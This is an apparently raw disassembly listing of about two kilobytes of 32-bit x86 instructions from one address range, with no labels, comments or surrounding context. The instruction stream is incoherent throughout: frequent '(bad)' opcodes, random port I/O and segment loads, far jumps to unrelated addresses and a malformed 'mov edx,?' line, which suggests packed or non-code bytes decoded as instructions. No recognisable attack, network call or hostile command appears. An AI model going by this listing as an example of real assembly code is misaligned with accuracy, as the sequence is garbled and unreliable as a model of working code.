  41b1e2:	mov    ebx,0xd1ed1077
  41b1e7:	retf   0x4e50
  41b1ea:	imul   ebp,DWORD PTR ds:0xafdd48af,0x1b
  41b1f1:	fwait
  41b1f2:	in     al,0xa7
  41b1f4:	pop    ds
  41b1f5:	in     al,0xa1
  41b1f7:	cld    
  41b1f8:	sub    al,0xf6
  41b1fa:	dec    esp
  41b1fb:	sub    eax,0x3c968cea
  41b200:	or     al,0xba
  41b202:	add    eax,0x30b81e3
  41b207:	in     al,0xa9
  41b209:	xchg   BYTE PTR [ecx-0x7f51c1c0],bl
  41b20f:	ret    
  41b210:	aad    0x6e
  41b212:	inc    edx
  41b213:	inc    ecx
  41b214:	mov    edx,0xa56ee2fe
  41b219:	inc    eax
  41b21a:	cwde   
  41b21b:	fistp  QWORD PTR [ebx-0x5c]
  41b21e:	add    al,BYTE PTR [eax+eiz*4]
  41b221:	jnp    0x41b28c
  41b223:	pop    eax
  41b225:	mov    ebx,0xec0fab11
  41b22a:	retf   
  41b22b:	mov    ecx,0x31c03f0e
  41b230:	xchg   edi,eax
  41b231:	pop    ss
  41b232:	ret    
  41b233:	push   cs
  41b234:	cmp    ah,0x40
  41b237:	dec    ebx
  41b238:	push   ecx
  41b239:	les    edx,FWORD PTR [ebx-0xe]
  41b23c:	test   BYTE PTR [ebp+0x5d9c40a5],dl
  41b242:	xlat   BYTE PTR ds:[ebx]
  41b243:	and    dh,0x13
  41b246:	cmc    
  41b247:	ds dec edi
  41b249:	pop    esp
  41b24a:	jmp    0x3aa40de4
  41b24f:	lods   eax,DWORD PTR ds:[esi]
  41b250:	fs sbb bh,bh
  41b253:	jg     0x41b22c
  41b255:	adc    al,0x8e
  41b257:	daa    
  41b258:	stc    
  41b259:	ficom  WORD PTR ds:0xfd6e09ec
  41b25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b260:	ins    BYTE PTR es:[edi],dx
  41b261:	repnz sub BYTE PTR [ecx+esi*2+0x7fee8e3e],al
  41b269:	sbb    BYTE PTR [edi],al
  41b26b:	or     BYTE PTR es:[edi-0xec793f4],ah
  41b272:	stos   DWORD PTR es:[edi],eax
  41b273:	mov    ecx,0x8bd70006
  41b278:	ins    DWORD PTR es:[edi],dx
  41b279:	jnp    0x41b2e6
  41b27b:	fstp   TBYTE PTR [ebx-0x7c]
  41b27e:	mov    esi,0xc9b8483c
  41b283:	data16 loopne 0x41b273
  41b286:	(bad)  
  41b287:	adc    bl,bh
  41b289:	(bad)  
  41b28a:	in     eax,0x99
  41b28c:	into   
  41b28d:	mov    ecx,0xfe1ddf48
  41b292:	repz push 0xffffffee
  41b295:	ficomp DWORD PTR [edx+edx*4-0x1f]
  41b299:	inc    edx
  41b29a:	aas    
  41b29b:	xor    esi,0x5d18a3e3
  41b2a1:	std    
  41b2a2:	push   0x89eb62ba
  41b2a7:	nop
  41b2a8:	(bad)  
  41b2a9:	(bad)  
  41b2aa:	sbb    bl,BYTE PTR [eax+0x65138538]
  41b2b0:	or     eax,0xd5682943
  41b2b5:	ret    0x81c9
  41b2b8:	scas   eax,DWORD PTR es:[edi]
  41b2b9:	adc    ch,ch
  41b2bb:	(bad)  [edi]
  41b2bd:	jbe    0x41b264
  41b2bf:	sub    BYTE PTR [eax+0x3e8706db],dh
  41b2c5:	mov    cs,WORD PTR ds:[esi-0x80]
  41b2c9:	inc    eax
  41b2ca:	cmp    DWORD PTR [eax+esi*4+0x51eb2b75],edi
  41b2d1:	pushf  
  41b2d2:	jo     0x41b288
  41b2d4:	ret    
  41b2d5:	lahf   
  41b2d6:	cmp    ch,BYTE PTR [ebx]
  41b2d8:	outs   dx,BYTE PTR ds:[esi]
  41b2d9:	push   ss
  41b2da:	mov    ecx,0x9d638161
  41b2df:	das    
  41b2e0:	fcom   DWORD PTR [edx-0x38]
  41b2e3:	inc    eax
  41b2e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2e5:	mov    ds,WORD PTR [edi-0x5f36bccb]
  41b2eb:	push   ebx
  41b2ec:	fsubp  st(1),st
  41b2ee:	sub    DWORD PTR [eax+0x50],edx
  41b2f1:	outs   dx,BYTE PTR ds:[esi]
  41b2f2:	jecxz  0x41b31f
  41b2f4:	xchg   esp,eax
  41b2f5:	jmp    0x41b29e
  41b2f7:	sar    DWORD PTR [esi*1+0x5413281],cl
  41b2fe:	int    0x5b
  41b300:	add    al,0x8c
  41b302:	sbb    DWORD PTR [eax],0x1
  41b305:	or     ebx,ebp
  41b307:	loop   0x41b2b5
  41b309:	push   ebx
  41b30a:	test   eax,0x27ff3b30
  41b30f:	ins    BYTE PTR es:[edi],dx
  41b310:	pop    esi
  41b311:	xchg   ecx,eax
  41b312:	(bad)  
  41b313:	repnz inc ebp
  41b315:	xchg   ebx,eax
  41b316:	frstor [esi+0x43a72a94]
  41b31c:	lea    edx,[eax]
  41b31e:	dec    edx
  41b31f:	ret    0xb234
  41b322:	rcr    dl,0xd2
  41b325:	ins    BYTE PTR es:[edi],dx
  41b326:	lds    esp,FWORD PTR [eax]
  41b328:	fsubr  st(7),st
  41b32a:	scas   eax,DWORD PTR es:[edi]
  41b32b:	lds    eax,FWORD PTR [esi+ebp*4+0x27abd79c]
  41b332:	pop    es
  41b333:	imul   ecx,DWORD PTR [esi-0x418b3014],0xffffffab
  41b33a:	mov    esi,0xac79c781
  41b33f:	fchs   
  41b341:	mov    edx,0x766c339b
  41b346:	add    BYTE PTR ds:0xe18ebb64,0x37
  41b34d:	mov    cl,0xab
  41b34f:	xchg   esi,eax
  41b350:	pop    edx
  41b351:	xor    DWORD PTR [eax+0x77c2e8fd],esp
  41b357:	std    
  41b358:	dec    ecx
  41b359:	lds    esi,FWORD PTR [esi+edi*8]
  41b35c:	sar    BYTE PTR [edx],0xd1
  41b35f:	mov    WORD PTR [eax+0x77d87469],fs
  41b365:	adc    eax,0x385bacc3
  41b36a:	cld    
  41b36b:	iret   
  41b36c:	out    dx,eax
  41b36d:	not    dl
  41b36f:	repnz mov ecx,0xd6be832c
  41b375:	in     eax,0x72
  41b377:	pop    eax
  41b378:	and    dl,cl
  41b37a:	fsub   DWORD PTR [edx+0x7d058d6f]
  41b380:	mov    ecx,0x1eecf4a1
  41b385:	and    eax,0xead00c50
  41b38a:	ret    0x3e53
  41b38d:	(bad)  
  41b38e:	mov    ebp,0x35eb17f0
  41b393:	les    esi,FWORD PTR [eax+0x47]
  41b396:	repnz and al,0x87
  41b399:	sub    DWORD PTR [edx],esi
  41b39b:	scas   al,BYTE PTR es:[edi]
  41b39c:	fidivr WORD PTR [ebp+0x2ad023a8]
  41b3a2:	out    dx,al
  41b3a3:	retf   0xfe39
  41b3a6:	or     al,0x2a
  41b3a8:	mov    cl,0xc2
  41b3aa:	clc    
  41b3ab:	push   ds
  41b3ac:	inc    esp
  41b3ad:	mov    bh,0xda
  41b3af:	div    BYTE PTR [esi+0x4e]
  41b3b2:	ja     0x41b33f
  41b3b4:	add    DWORD PTR [esi+0x4d650be4],esi
  41b3ba:	adc    BYTE PTR [eax-0x59],0x6b
  41b3be:	mov    ecx,0x10682d83
  41b3c3:	jp     0x41b3e4
  41b3c5:	push   esp
  41b3c6:	xor    BYTE PTR [edi+edx*2],al
  41b3c9:	nop
  41b3ca:	sahf   
  41b3cb:	fsub   QWORD PTR [edi]
  41b3cd:	mov    al,ds:0x98b0f2b
  41b3d2:	inc    esi
  41b3d3:	out    0xc2,al
  41b3d5:	mov    ch,0x6f
  41b3d7:	test   bl,bh
  41b3d9:	rcr    dh,cl
  41b3db:	in     al,dx
  41b3dc:	push   eax
  41b3dd:	dec    eax
  41b3de:	cmp    eax,0x6d369219
  41b3e3:	xor    bh,dl
  41b3e5:	push   ss
  41b3e6:	cs std 
  41b3e8:	adc    DWORD PTR [edx-0x3d],ebp
  41b3eb:	xchg   ebp,eax
  41b3ec:	iret   
  41b3ed:	mov    edi,0xd9553cf3
  41b3f2:	add    ch,BYTE PTR [eax-0x4f]
  41b3f5:	popf   
  41b3f6:	adc    eax,0xbd3182ed
  41b3fb:	cmp    al,0xa0
  41b3fd:	adc    eax,0x3fe4ed1
  41b402:	adc    BYTE PTR [esp+edx*8],dl
  41b405:	dec    eax
  41b406:	push   esp
  41b407:	add    al,0xa7
  41b409:	mov    edx,0x6fd1e04
  41b40e:	dec    edi
  41b40f:	jno    0x41b3b8
  41b411:	sub    eax,0x3538a153
  41b416:	int3   
  41b417:	out    0x9f,al
  41b419:	(bad)  
  41b41a:	or     al,0xbb
  41b41c:	dec    esp
  41b41d:	inc    edi
  41b41e:	jbe    0x41b3b3
  41b420:	mov    esi,0xd7594dd6
  41b425:	mov    esi,0xa035f24f
  41b42a:	xlat   BYTE PTR ds:[ebx]
  41b42b:	ficom  WORD PTR [ebx]
  41b42d:	cmp    ecx,DWORD PTR [edi-0x37]
  41b430:	dec    edi
  41b431:	push   edi
  41b432:	rcl    DWORD PTR [esi+edx*8+0x13588641],0x66
  41b43a:	ss fs retf 0x186b
  41b43f:	in     al,0x3d
  41b441:	cwde   
  41b442:	add    eax,0xa1d108af
  41b447:	sub    ecx,eax
  41b449:	mov    ah,0x3b
  41b44b:	int3   
  41b44c:	jnp    0x41b41e
  41b44e:	cwde   
  41b44f:	bound  ecx,QWORD PTR [ebp-0x57]
  41b452:	ds push ebx
  41b454:	push   0xffffff9b
  41b456:	loope  0x41b43f
  41b458:	mov    eax,ds:0xae0c7f77
  41b45d:	pop    ebp
  41b45e:	pushf  
  41b45f:	ds push edi
  41b461:	mov    ecx,0x8e85650b
  41b466:	fucomip st,st(5)
  41b468:	xchg   BYTE PTR [ecx+0x56],dl
  41b46b:	fnstcw WORD PTR [edx+ebp*1+0x6e482a2f]
  41b472:	xchg   esp,eax
  41b473:	cld    
  41b474:	pushf  
  41b475:	ret    0xa72
  41b478:	into   
  41b479:	cmp    dl,BYTE PTR [edx+edi*4+0xe]
  41b47d:	inc    esi
  41b47e:	mov    ds:0xfe293cad,al
  41b483:	add    esi,DWORD PTR [ebp+0x10d0e2fe]
  41b489:	mov    cl,0x46
  41b48b:	adc    DWORD PTR [ecx+0x4a],eax
  41b48e:	cmp    al,0x74
  41b490:	pop    esp
  41b491:	(bad)  
  41b492:	xchg   edx,eax
  41b493:	sar    BYTE PTR ds:0x1b8f7c75,0xa1
  41b49a:	jae    0x41b4d7
  41b49c:	jnp    0x41b47d
  41b49e:	dec    edi
  41b49f:	(bad)  
  41b4a0:	pop    eax
  41b4a1:	out    dx,al
  41b4a2:	lahf   
  41b4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4a4:	cmp    BYTE PTR [ecx+0x50fb683],cl
  41b4aa:	jno    0x41b4d4
  41b4ac:	xor    al,0x5f
  41b4ae:	ds loop 0x41b49b
  41b4b1:	sub    BYTE PTR [eax],0x88
  41b4b4:	jne    0x41b47e
  41b4b6:	mov    eax,ds:0x3b74ab35
  41b4bb:	les    eax,FWORD PTR ds:0x9003aa1c
  41b4c1:	(bad)  
  41b4c2:	cs iret 
  41b4c4:	jns    0x41b4fa
  41b4c6:	push   es
  41b4c7:	cmp    BYTE PTR [edx+edi*1+0x6f8147a2],bh
  41b4ce:	sbb    al,0x64
  41b4d0:	jb     0x41b46d
  41b4d2:	sbb    al,0x7
  41b4d4:	sbb    di,WORD PTR [ebx+ecx*1+0x3e]
  41b4d9:	addr16 jae 0x41b514
  41b4dc:	pop    es
  41b4dd:	ret    0xbb8e
  41b4e0:	and    al,0x5e
  41b4e2:	push   0xffffff82
  41b4e4:	enter  0x5be5,0x42
  41b4e8:	xchg   dh,dl
  41b4ea:	pop    edx
  41b4ec:	stos   DWORD PTR es:[edi],eax
  41b4ed:	mov    al,0xa3
  41b4ef:	push   es
  41b4f0:	jae    0x41b519
  41b4f2:	adc    al,0xf
  41b4f4:	ss inc ebp
  41b4f6:	loopne 0x41b563
  41b4f8:	es retf 0xb50e
  41b4fc:	(bad)  
  41b4fd:	cmc    
  41b4fe:	test   al,ch
  41b500:	adc    DWORD PTR [esi+0x43],0xe
  41b504:	xor    eax,0x68e90677
  41b509:	xchg   esi,eax
  41b50a:	and    ebp,ebx
  41b50c:	sbb    cl,BYTE PTR [edi]
  41b50e:	nop
  41b50f:	cs mov ch,0x97
  41b512:	xor    eax,0x6d3fe84e
  41b517:	pop    edi
  41b518:	mov    eax,ds:0xc1a34107
  41b51d:	push   0x2625d3
  41b522:	imul   eax,DWORD PTR [eax-0x5dd9386c],0xb4814b88
  41b52c:	ret    
  41b52d:	fidiv  DWORD PTR [ebp-0x594e66b8]
  41b533:	pop    edi
  41b534:	(bad)  
  41b535:	mov    edx,0xee530bac
  41b53a:	dec    ebp
  41b53b:	push   eax
  41b53c:	mov    edx,?
  41b53e:	push   cs
  41b53f:	cs xchg ebx,eax
  41b541:	dec    ebp
  41b542:	js     0x3e788b13
  41b548:	jo     0x41b58f
  41b54a:	fucomip st,st(1)
  41b54c:	imul   edx,DWORD PTR [eax-0x6fd58eb3],0x197b5d81
  41b556:	jae    0x41b5b4
  41b558:	inc    esp
  41b559:	iret   
  41b55a:	sbb    eax,0x17b15a13
  41b55f:	sub    ebp,DWORD PTR [eax+0x19]
  41b562:	add    esp,ebx
  41b564:	or     eax,0xb418eeb6
  41b569:	xchg   edi,eax
  41b56a:	jb     0x41b518
  41b56c:	sub    al,0x10
  41b56e:	stc    
  41b56f:	push   0xd8a974ba
  41b574:	ror    DWORD PTR [edi],cl
  41b576:	dec    esp
  41b577:	daa    
  41b578:	test   al,0x37
  41b57a:	aas    
  41b57b:	adc    DWORD PTR [ebx],0x2a0d4999
  41b581:	or     cl,dh
  41b583:	mov    dh,BYTE PTR [esi-0x224c625b]
  41b589:	neg    BYTE PTR [esi+0x2cc773c7]
  41b58f:	mov    BYTE PTR [ebp-0x3ae2d3a],0xf0
  41b596:	lods   al,BYTE PTR ds:[esi]
  41b597:	jmp    0x41b58e
  41b599:	sub    BYTE PTR [ecx+0x14350a4f],cl
  41b59f:	mov    al,ds:0x4585aef0
  41b5a4:	and    BYTE PTR [ecx-0x3],0x88
  41b5a8:	mov    ds:0x2effdb85,al
  41b5ad:	mov    eax,0xbabb863c
  41b5b2:	push   ss
  41b5b3:	inc    eax
  41b5b4:	adc    ecx,edi
  41b5b6:	outs   dx,BYTE PTR ds:[esi]
  41b5b7:	jl     0x41b622
  41b5b9:	mov    ds:0x97d9edd0,al
  41b5be:	and    eax,0x2f140194
  41b5c3:	scas   eax,DWORD PTR es:[edi]
  41b5c4:	xchg   edx,eax
  41b5c5:	(bad)  
  41b5c6:	xor    DWORD PTR [edi-0x7ea866ea],0x4ff77082
  41b5d0:	outs   dx,BYTE PTR ds:[esi]
  41b5d1:	lock adc BYTE PTR [ebx],bh
  41b5d4:	gs ja  0x41b5ab
  41b5d7:	dec    eax
  41b5d8:	test   eax,0x995cd6bb
  41b5dd:	inc    edx
  41b5de:	(bad)  
  41b5e1:	(bad)  
  41b5e2:	push   esi
  41b5e3:	clc    
  41b5e4:	cmp    eax,0x91cb1b1a
  41b5e9:	fwait
  41b5ea:	dec    esi
  41b5eb:	and    al,BYTE PTR ds:0xc036220c
  41b5f1:	or     eax,0x1af3f569
  41b5f6:	jns    0x41b623
  41b5f8:	sbb    esp,edx
  41b5fa:	mov    bl,0x12
  41b5fc:	scas   al,BYTE PTR es:[edi]
  41b5fd:	jmp    0xb6fdb92e
  41b602:	popa   
  41b603:	stc    
  41b604:	out    dx,eax
  41b605:	sar    DWORD PTR [edx],cl
  41b607:	and    eax,0x1cf4b25f
  41b60c:	push   es
  41b60d:	inc    ecx
  41b60e:	cmp    DWORD PTR [ebp-0x27],edi
  41b611:	bound  edx,QWORD PTR [edx+ebp*1-0x57b1ed16]
  41b618:	popf   
  41b619:	mov    eax,0xf614b110
  41b61e:	ror    ch,0xcd
  41b621:	push   edx
  41b622:	ret    
  41b623:	lahf   
  41b624:	push   edi
  41b625:	gs push eax
  41b627:	icebp  
  41b628:	mov    edi,0xcaad0ecf
  41b62d:	retf   
  41b62e:	fld    TBYTE PTR [esi-0x27]
  41b631:	test   al,0x38
  41b633:	cwde   
  41b634:	push   ds
  41b635:	ja     0x41b5d8
  41b637:	test   eax,0xffa3ff4
  41b63c:	jg     0x41b5cb
  41b63e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b63f:	in     al,dx
  41b640:	bound  ebx,QWORD PTR [edx+0x2]
  41b643:	cwde   
  41b644:	test   DWORD PTR [esi+0x5ad9298f],ebp
  41b64a:	xlat   BYTE PTR ds:[ebx]
  41b64b:	iret   
  41b64c:	(bad)
  41b650:	pop    edx
  41b651:	mov    dl,0x3
  41b653:	leave  
  41b654:	mov    ah,0x6a
  41b656:	add    DWORD PTR [eax-0x743ff75c],esi
  41b65c:	mov    dh,0xcb
  41b65e:	and    ch,BYTE PTR [ecx]
  41b660:	or     DWORD PTR [edi-0x613f06e3],edx
  41b666:	inc    ecx
  41b667:	je     0x41b614
  41b669:	mov    cl,0xcb
  41b66b:	inc    ebp
  41b66c:	test   DWORD PTR [eax+0xc4163e3],ebx
  41b672:	ss sahf 
  41b674:	sahf   
  41b675:	xchg   edx,eax
  41b676:	dec    esi
  41b677:	in     al,dx
  41b678:	adc    BYTE PTR [esi-0x42],dl
  41b67b:	jmp    0x41b604
  41b67d:	(bad)
  41b680:	xchg   esp,eax
  41b681:	not    dl
  41b683:	jmp    0x4beab37f
  41b688:	sub    DWORD PTR [edi-0xb9269af],0x65c59709
  41b692:	out    dx,al
  41b693:	das    
  41b694:	mov    ecx,0xbe14d905
  41b699:	and    BYTE PTR [esi+0x38],dh
  41b69c:	lods   eax,DWORD PTR ss:[esi]
  41b69e:	mov    dl,0xa4
  41b6a0:	pusha  
  41b6a1:	retf   0x38dc
  41b6a4:	(bad)  
  41b6a5:	ds shl ch,0xc9
  41b6a9:	pop    edx
  41b6aa:	mov    dh,0x2
  41b6ac:	sbb    al,0x74
  41b6ae:	ins    DWORD PTR es:[edi],dx
  41b6af:	xchg   BYTE PTR [eax+0x78],bh
  41b6b2:	call   0x9a0843df
  41b6b7:	mov    WORD PTR [edi],ds
  41b6b9:	ds (bad) 
  41b6bb:	push   esi
  41b6bc:	and    ecx,DWORD PTR [ebp-0x485b11be]
  41b6c2:	jl     0x41b6cf
  41b6c4:	mov    al,ds:0x28ba3f46
  41b6c9:	dec    edx
  41b6ca:	xchg   edx,edi
  41b6cc:	xor    eax,0xd5f697de
  41b6d1:	sahf   
  41b6d2:	jnp    0x41b722
  41b6d4:	adc    esi,DWORD PTR [edi+0x53]
  41b6d7:	mov    al,ds:0x4aa6ca76
  41b6dc:	or     BYTE PTR [ebp-0x1f1fecc7],dl
  41b6e2:	xchg   esi,eax
  41b6e3:	sbb    bh,BYTE PTR [ebp+0x5e]
  41b6e6:	adc    bl,BYTE PTR [esp+0x45]
  41b6ea:	cmp    cl,ch
  41b6ec:	mov    al,0x49
  41b6ee:	cli    
  41b6ef:	and    al,bh
  41b6f1:	call   0x61ca:0x1dc273b9
  41b6f8:	ins    DWORD PTR es:[edi],dx
  41b6f9:	clc    
  41b6fa:	xor    bl,BYTE PTR [edi-0x3]
  41b6fd:	stos   DWORD PTR es:[edi],eax
  41b6fe:	jl     0x41b773
  41b700:	xlat   BYTE PTR ds:[ebx]
  41b701:	xchg   ah,bh
  41b703:	shl    bh,1
  41b705:	bound  ebp,QWORD PTR [edi-0x48]
  41b708:	push   ss
  41b709:	add    eax,0x931e2481
  41b70e:	rcl    BYTE PTR [edx],0x1f
  41b711:	fistp  WORD PTR [ebp-0xaa29eb3]
  41b717:	mov    esp,0x8cbc0f11
  41b71c:	call   0xee756556
  41b721:	adc    al,0xca
  41b723:	icebp  
  41b724:	sahf   
  41b725:	mov    ah,0xae
  41b727:	dec    DWORD PTR [ebx+0x22]
  41b72a:	mov    esp,0x8e1567a
  41b72f:	icebp  
  41b730:	add    cl,BYTE PTR [ecx-0x2]
  41b733:	fwait
  41b734:	cmc    
  41b735:	mov    ebp,0x37493682
  41b73a:	stos   BYTE PTR es:[edi],al
  41b73b:	lea    edx,[eax-0x2e384d51]
  41b741:	mov    ecx,0x4ee22bc1
  41b746:	out    0x3b,eax
  41b748:	or     al,0xd9
  41b74a:	rol    DWORD PTR [ebx],1
  41b74c:	fldcw  WORD PTR [ebp-0x4923b9df]
  41b752:	mov    dh,0xeb
  41b754:	xchg   ebp,eax
  41b755:	or     dh,BYTE PTR [ebp+0x64]
  41b758:	jge    0x41b7cd
  41b75a:	retf   
  41b75b:	push   ebx
  41b75c:	loop   0x41b76e
  41b75e:	or     edi,ebp
  41b760:	ret    0x71e6
  41b763:	mov    eax,0x5af245d8
  41b768:	inc    edx
  41b769:	aas    
  41b76a:	scas   eax,DWORD PTR es:[edi]
  41b76b:	and    eax,DWORD PTR [esi]
  41b76d:	lods   eax,DWORD PTR ds:[esi]
  41b76e:	fcmovnu st,st(2)
  41b770:	dec    edi
  41b771:	xor    al,0x87
  41b773:	das    
  41b774:	test   bl,dh
  41b776:	sub    ch,bl
  41b778:	jo     0x41b77c
  41b77a:	fs imul esp,esp,0xe2fcf4e3
  41b781:	adc    DWORD PTR [edi+eax*1],0x5f
  41b785:	cmp    eax,0xe83aca9b
  41b78a:	add    ebp,DWORD PTR [edx+0x1e]
  41b78d:	jg     0x41b7eb
  41b78f:	mov    ecx,0xb8ae713e
  41b794:	xor    BYTE PTR [esi+eax*8+0x2b],bh
  41b798:	test   BYTE PTR [ecx+0x5d1870be],ch
  41b79e:	pop    esi
  41b79f:	ds jmp 0xf8fa1699
  41b7a5:	mov    DWORD PTR [edi-0x4241c0e],ebp
  41b7ab:	mov    ah,0x70
  41b7ad:	in     eax,0xff
  41b7af:	sbb    ch,bh
  41b7b1:	daa    
  41b7b2:	xchg   BYTE PTR [edx+0x77],al
  41b7b5:	mov    ebx,0x36ef8538
  41b7ba:	fld    DWORD PTR [ecx-0x38]
  41b7bd:	cdq    
  41b7be:	jle    0x41b7f3
  41b7c0:	sbb    al,0x1b
  41b7c2:	jmp    0x5883:0x7b7cc7c0
  41b7c9:	repz pop edi
  41b7cb:	mov    bl,0x6f
  41b7cd:	jle    0x41b7b5
  41b7cf:	xor    BYTE PTR ss:[edx-0xd665bed],0xa9
  41b7d7:	test   eax,0x9d7336e9
  41b7dc:	fs (bad) 
  41b7de:	fbld   TBYTE PTR [esi-0x7d]
  41b7e1:	pop    ebp
  41b7e2:	mov    eax,0xbc2d4691
  41b7e7:	push   ds
  41b7e8:	inc    esp
  41b7e9:	push   ebp
  41b7ea:	das    
  41b7eb:	aas    
  41b7ec:	jb     0x41b79b
  41b7ee:	call   0xf2969de0
  41b7f3:	sbb    edi,DWORD PTR [esi]
  41b7f5:	out    dx,eax
  41b7f6:	sbb    eax,0xf3233514
  41b7fb:	fmulp  st(2),st
  41b7fd:	shl    ch,1
  41b7ff:	dec    eax
  41b800:	cwde   
  41b801:	sbb    WORD PTR [edi+eiz*4+0x75199900],sp
  41b809:	or     BYTE PTR [ecx+ebx*4],ah
  41b80c:	maxps  xmm2,XMMWORD PTR [edx]
  41b80f:	nop
  41b810:	sub    ah,BYTE PTR [eax+0x5263deb3]
  41b816:	inc    edi
  41b817:	test   DWORD PTR [edi+0x5f],eax
  41b81a:	mov    ds:0x7617b783,eax
  41b81f:	fucomp st(2)
  41b821:	nop
  41b822:	inc    ebx
  41b823:	push   ds
  41b824:	lds    edi,FWORD PTR [ecx]
  41b826:	add    esi,edx
  41b828:	cmp    DWORD PTR [ebp-0x1b76565c],0xffffffa7
  41b82f:	pop    ds
  41b830:	ds pop edx
  41b832:	mov    ss,ebp
  41b834:	add    esp,DWORD PTR fs:[edi+0x1d]
  41b838:	or     bl,bl
  41b83a:	shl    DWORD PTR [ebp+0xe],cl
  41b83d:	sbb    eax,0x7bdbe527
  41b842:	ror    BYTE PTR [edx+ecx*8],1
  41b845:	and    BYTE PTR [ebx-0x2c],dl
  41b848:	int    0x32
  41b84a:	xchg   ebp,eax
  41b84b:	adc    BYTE PTR [eax+0x4e425a47],ah
  41b851:	pop    ss
  41b852:	jno    0x41b8cd
  41b854:	inc    esi
  41b855:	mov    edi,0x5633004c
  41b85a:	dec    esi
  41b85b:	mov    ah,0x53
  41b85d:	or     al,0x5b
  41b85f:	push   es
  41b860:	cs inc edx
  41b862:	mov    ecx,0x8051d81e
  41b867:	sub    esp,DWORD PTR [ebx]
  41b869:	test   al,0x95
  41b86b:	rcr    BYTE PTR [esi],0x7f
  41b86e:	pop    edx
  41b86f:	es inc edx
  41b871:	and    al,0x4
  41b873:	lahf   
  41b874:	test   BYTE PTR [ecx+0x2ae50405],bl
  41b87a:	or     al,0x27
  41b87c:	or     eax,0x358f63ea
  41b881:	sub    al,0xdc
  41b883:	mov    ds:0xf60dff2b,eax
  41b888:	shl    BYTE PTR [edi],cl
  41b88a:	push   ds
  41b88b:	pop    edx
  41b88c:	mov    eax,ds:0x3989b510
  41b891:	lods   eax,DWORD PTR ds:[esi]
  41b892:	into   
  41b893:	loopne 0x41b83b
  41b895:	lods   eax,DWORD PTR ds:[esi]
  41b896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b897:	push   eax
  41b898:	mov    edx,0xd1429f76
  41b89d:	jge    0x41b897
  41b89f:	xchg   eax,ebp
  41b8a1:	add    eax,DWORD PTR [edi+0x55]
  41b8a4:	lods   al,BYTE PTR ds:[esi]
  41b8a5:	push   ecx
  41b8a6:	ret    0xde92
  41b8a9:	cwde   
  41b8aa:	cdq    
  41b8ab:	retf   0x627b
  41b8ae:	shl    DWORD PTR [eax+edx*1],cl
  41b8b1:	repnz lods al,BYTE PTR ds:[esi]
  41b8b3:	es pop esp
  41b8b5:	je     0x41b8ab
  41b8b7:	add    ah,BYTE PTR [eax]
  41b8b9:	inc    esi
  41b8ba:	jnp    0x41b8f5
  41b8bc:	fmul   DWORD PTR [edx+0x48]
  41b8bf:	cmp    edi,ecx
  41b8c1:	mov    BYTE PTR [edi],cl
  41b8c3:	xor    al,0xdb
  41b8c5:	cs es push esp
  41b8c8:	cmc    
  41b8c9:	add    al,0x1
  41b8cb:	loop   0x41b89d
  41b8cd:	(bad)  
  41b8ce:	pop    esp
  41b8cf:	ret    
  41b8d0:	(bad)  
  41b8d1:	adc    DWORD PTR [edi+0x8a80455],edx
  41b8d7:	pop    edi
  41b8d8:	in     eax,0x64
  41b8da:	ror    DWORD PTR [esp+eiz*8],0x3
  41b8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8df:	repz stc 
  41b8e1:	jmp    0x41b91a
  41b8e3:	sub    DWORD PTR [ecx-0x35648e2a],esi
  41b8e9:	ins    DWORD PTR es:[edi],dx
  41b8ea:	xor    eax,0x4a3da1bd
  41b8ef:	outs   dx,DWORD PTR ds:[esi]
  41b8f0:	inc    ebp
  41b8f1:	pusha  
  41b8f2:	mov    esp,0x83dcf670
  41b8f7:	mov    dh,0xe6
  41b8f9:	dec    esi
  41b8fa:	push   edi
  41b8fb:	xchg   edx,eax
  41b8fc:	mov    esi,0xa97272ea
  41b901:	mov    bh,0x60
  41b903:	and    DWORD PTR [eax-0x33],ebp
  41b906:	dec    ecx
  41b907:	test   BYTE PTR [edi-0x7117be1b],bh
  41b90d:	mul    DWORD PTR [esi+esi*4+0x41]
  41b911:	adc    al,0x29
  41b913:	or     al,0xac
  41b915:	or     al,0xc
  41b917:	leave  
  41b918:	es pop esi
  41b91a:	xchg   edi,eax
  41b91b:	adc    DWORD PTR [edi],0xab3c6ecb
  41b921:	inc    ebx
  41b922:	jns    0x41b8af
  41b924:	mov    dh,0x94
  41b926:	cli    
  41b927:	jmp    0x41b977
  41b929:	pop    esi
  41b92a:	adc    ah,ch
  41b92c:	mov    gs,WORD PTR [edx]
  41b92e:	sub    BYTE PTR [ebp+0x5c77541],ch
  41b934:	cmc    
  41b935:	dec    ecx
  41b936:	push   ebp
  41b937:	into   
  41b938:	std    
  41b939:	and    esp,DWORD PTR [edx]
  41b93b:	repz add al,0xd3
  41b93e:	push   ds
  41b93f:	add    BYTE PTR [esi+0x67],ch
  41b942:	push   ds
  41b943:	dec    ebp
  41b944:	or     eax,0xb67a9471
  41b949:	push   esi
  41b94a:	ins    BYTE PTR es:[edi],dx
  41b94b:	pop    eax
  41b94c:	and    DWORD PTR [eax-0x56],0x7a5f970f
  41b953:	push   ebx
  41b954:	clc    
  41b955:	mov    WORD PTR [ecx],ds
  41b957:	(bad)  
  41b958:	cmp    esi,edi
  41b95a:	stos   DWORD PTR es:[edi],eax
  41b95b:	mov    dl,BYTE PTR [ebx-0xd]
  41b95e:	int3   
  41b95f:	outs   dx,DWORD PTR ds:[esi]
  41b960:	retf   0x7296
  41b963:	push   cs
  41b964:	pand   mm4,QWORD PTR [ecx+0x47ba9fdc]
  41b96b:	cmp    DWORD PTR [ebp-0x766ca6f3],ebp
  41b971:	rcl    BYTE PTR ds:0x781465ec,cl
  41b977:	shr    ecx,cl
  41b979:	ins    DWORD PTR es:[edi],dx
  41b97a:	cmovb  edx,esp
  41b97d:	cld    
  41b97e:	add    DWORD PTR [edx-0x14],eax
  41b981:	dec    ecx
  41b982:	je     0x41b98b
  41b984:	or     BYTE PTR [ebx+ebx*1-0x77afc9c1],bh
  41b98b:	xor    eax,0x79165f06
  41b990:	inc    edi
  41b991:	mov    bl,0x49
  41b993:	sti    
  41b994:	enter  0xd319,0x7d
  41b998:	aad    0x9c
  41b99a:	xchg   DWORD PTR [edi],esp
  41b99c:	xchg   edx,eax
  41b99d:	shr    DWORD PTR [edx-0x67],cl
  41b9a0:	loopne 0x41b983
  41b9a2:	lock sub eax,0xb0610cd6
